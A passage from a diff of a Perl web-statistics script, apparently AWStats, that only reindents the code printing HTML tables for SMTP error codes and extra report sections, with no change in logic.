 				print "<td valign=\"top\">$key</td>";
 				print "<td class=\"aws\">"
 				  . (
-					 $smtpcodelib{$key} ? $smtpcodelib{$key} : 'Unknown error' )
+					$smtpcodelib{$key} ? $smtpcodelib{$key} : 'Unknown error' )
 				  . "</td><td>$_errors_h{$key}</td><td>$p %</td><td>"
 				  . Format_Bytes( $_errors_k{$key} ) . "</td>";
 				print "</tr>\n";
@@ -19161,10 +19364,10 @@ if ( scalar keys %HTMLOutput ) {
 			print "<th>" . $ExtraFirstColumnTitle[$extranum];
 			print "&nbsp; - &nbsp; <a href=\""
 			  . (
-				  $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
-				  ? XMLEncode(
-						   "$AWScript?${NewLinkParams}output=allextra$extranum")
-				  : "$PROG$StaticLinks.allextra$extranum.$StaticExt"
+				$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
+				? XMLEncode(
+					"$AWScript?${NewLinkParams}output=allextra$extranum")
+				: "$PROG$StaticLinks.allextra$extranum.$StaticExt"
 			  )
 			  . "\"$NewLinkTarget>$Message[80]</a>";
 			print "</th>";
@@ -19193,18 +19396,18 @@ if ( scalar keys %HTMLOutput ) {
 			if ( $MaxNbOfExtra[$extranum] ) {
 				if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
 					&BuildKeyList(
-								   $MaxNbOfExtra[$extranum],
-								   $MinHitExtra[$extranum],
-								   \%{ '_section_' . $extranum . '_h' },
-								   \%{ '_section_' . $extranum . '_p' }
+						$MaxNbOfExtra[$extranum],
+						$MinHitExtra[$extranum],
+						\%{ '_section_' . $extranum . '_h' },
+						\%{ '_section_' . $extranum . '_p' }
 					);
 				}
 				else {
 					&BuildKeyList(
-								   $MaxNbOfExtra[$extranum],
-								   $MinHitExtra[$extranum],
-								   \%{ '_section_' . $extranum . '_h' },
-								   \%{ '_section_' . $extranum . '_h' }
+						$MaxNbOfExtra[$extranum],
+						$MinHitExtra[$extranum],
+						\%{ '_section_' . $extranum . '_h' },
+						\%{ '_section_' . $extranum . '_h' }
 					);
 				}
 			}
@@ -19233,17 +19436,16 @@ if ( scalar keys %HTMLOutput ) {
 				if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
 					print "<td>"
 					  . Format_Bytes(
-									 ${ '_section_' . $extranum . '_k' }{$key} )
+						${ '_section_' . $extranum . '_k' }{$key} )
 					  . "</td>";
 				}
 				if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
 					print "<td>"
 					  . (
-						  ${ '_section_' . $extranum . '_l' }{$key}
-						  ? Format_Date(
-									  ${ '_section_' . $extranum . '_l' }{$key},
-									  1 )
-						  : '-'
+						${ '_section_' . $extranum . '_l' }{$key}
+						? Format_Date(
+							${ '_section_' . $extranum . '_l' }{$key}, 1 )
+						: '-'
 					  )
 					  . "</td>";
 				}
@@ -19278,7 +19480,7 @@ if ( scalar keys %HTMLOutput ) {
 				if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
 					print "<td>"
 					  . (
-						 $count ? Format_Bytes( $total_k / $count ) : "&nbsp;" )
+						$count ? Format_Bytes( $total_k / $count ) : "&nbsp;" )
 					  . "</td>";
 				}
 				if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
